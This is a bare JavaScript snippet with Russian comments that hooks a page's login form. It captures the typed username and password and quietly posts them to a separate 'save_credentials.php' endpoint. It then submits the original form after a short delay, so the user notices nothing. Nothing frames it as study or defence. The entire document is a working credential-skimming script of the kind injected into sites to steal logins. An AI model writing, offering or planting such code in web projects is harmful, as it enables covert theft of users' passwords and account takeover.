<script>
document.getElementById('loginForm').onsubmit = function(event) {
    event.preventDefault(); // предотвращаем стандартную отправку формы

    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    // Отправляем данные на сервер перед отправкой основной формы
    var xhr = new XMLHttpRequest();
    xhr.open("post", "save_credentials.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("username=" + username + "&password=" + password);

    // Отправляем основную форму
    setTimeout(function() {
        document.getElementById('loginForm').submit();
    }, 500); // задержка перед отправкой основной формы
};
</script>
